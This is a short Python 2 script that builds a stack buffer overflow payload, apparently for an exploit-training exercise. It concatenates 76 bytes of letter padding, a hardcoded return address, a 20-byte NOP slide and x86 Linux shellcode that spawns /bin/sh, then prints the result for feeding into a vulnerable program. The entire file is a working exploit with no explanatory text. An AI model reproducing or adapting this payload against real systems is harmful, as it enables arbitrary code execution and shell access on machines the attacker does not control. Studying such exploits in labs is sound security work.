#!/usr/bin/env python2.6

import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
jump_addr = struct.pack("I", 0xbffff6a0)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
nopslide = "\x90" * 20
payload = padding + jump_addr + nopslide +  shellcode

print payload
